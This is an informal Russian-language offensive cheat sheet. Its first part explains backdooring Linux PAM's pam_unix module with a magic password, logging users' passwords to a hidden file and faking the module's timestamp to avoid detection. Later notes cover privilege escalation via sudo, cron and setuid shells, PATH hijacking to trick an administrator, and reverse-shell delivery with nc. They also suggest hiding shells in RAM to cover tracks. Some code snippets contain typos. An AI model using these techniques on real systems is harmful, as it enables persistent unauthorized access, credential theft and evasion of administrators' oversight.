Бедкор
  Качай (http://www.linux-pam.org/library/Linux-PAM-1.1.8.tar.gz), иди в Linux-PAM-1.1.8/modules/pam_unix/pam_unix_auth.c и буквально на 4 строке
  (после retval)  дописывай такой код  (if (strcmp(p,"urmagic") == 0) {
                                            retval = PAM_SUCCES;
                                         }                                 )
  Потом собирай можуль и заменяй им оригинальный  $ ./configure
                                                  $ make
                                                  $ sudo cp Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /lib/x86_64-linux-gnu/security/
   И чисто для конспирации даём время нашему модулю как и у остальных $ sudo touch -r /lib/x86_64-linux-gnu/security/pam_ftp.so /lib/x86_64-linux-gnu/security/pam_unix.so
        Так же, можешь логировать пассы успешно вошедших юзеров, чеб нет? добавь такой код туда же в pam_unix.so (if (retval == PAM_SUCCESS){
                                                                                                                     FILE *fg;
                                                                                                                     fg = fopen("/tmp/.passwd", "a");
                                                                                                                     fprint(fg, "%s:%s/n", name, p);
                                                                                                                     fclose
                                                                                                                   }                                            )
                                                                                                                   
LPE
    Первым делом нужно узнать версию ядра (uname -a) и искаль сплоиты
    Далее проверка запущенных от рута приложений, это показываеть открытые порты (netstat -antup) это запущенные приложения (ps -aux | grep root)
    Далее чекай приложения которые ты можешь юзать и которые по идее могут обладать рут правами (find / -perm -u=s -type f 2>/dev/null)
    Атака на sudo, чекаем какие приложения мы можем запускать как рут (sudo -l) и запускаем, вот шелл для find (sudo find /home -exec sh -i \;) для питона (sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’)
    Атака на крон джобы, сначала чек (ls -la /etc/cron.d), далее проверка на возможность записи (find / -perm -2 -type f 2>/dev/null), выполнение кода, в данном случае изменение прав скрипта, который даст нам рут шел (echo “chown root:root /tmp/rootme; chmod u+s /tmp/rootme;”>/usr/local/sbin/cron-logrotate.sh)
    Интересно что в /etc/services хрaняться списки сервисов, довольно очевидно но я этого не знaл                                                                                                                                                                                                                        Сам скрипт на С будет выглядеть так (int main (void)
                                                                                                                                                                                                                                                                 {
                                                                                                                                                                                                                                                                 setgid(0);
                                                                                                                                                                                                                                                                 setuid(0);
                                                                                                                                                                                                                                                                 execl ("/bin/sh", "sh", 0);
                                                                                                                                                                                                                                                                 })
    Соц инжир, ставим скрипт на команду, например, ls чтобы она меняла пасс админа и говорим админу юзнуть команду, вроде как работает только в определённой директории
    где и расположен скрипт, что логично, но нам это не помешает, сделали скрипт в названием ls, далее (PATH=.:${PATH}) и (export PATH), всё, завём админа и говорим что тут не работает ls
    SSH, командой (cat /conf/clearpasswd) можешь чекануть пароли в нём
    
    Интересный и весёлый способ LPE, некоторые бинарники (скрипты тоже) могут иметь большие права и использовать другие бинарники, мы можем заменить эти бинарники на свои,
    берём бинарник, выясняем что он использует командой strings, потом делаем скрипт который нам нужен и называем его названием бинарника, изменяет PATH но тот где этот скрипт
    и запускаем основной бинарник.
    
    
    
    
    
    
                                                                                                                                                                                                                                                                     
                                                                                                                                                                                                                                                                     
   Спавн консоли (python -c 'import pty;pty.spawn("/bin/bash")')                                                                                                                                                                                             
    
   Есть клёвый способ доставки реверс шелла с пентест манки, (nc -lvnp 9001 < cmd) в cmd у нас код шела, на жертве (nc [ip] 9001|python)
   Путь /dev/sgm/ это RAM, так что заметёшь следы если кидаешь сюда шелы 
  
   
   
   NOTE_notice, доставать процессы из фона-(fg)
   вот ескейп из rbash (https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf)
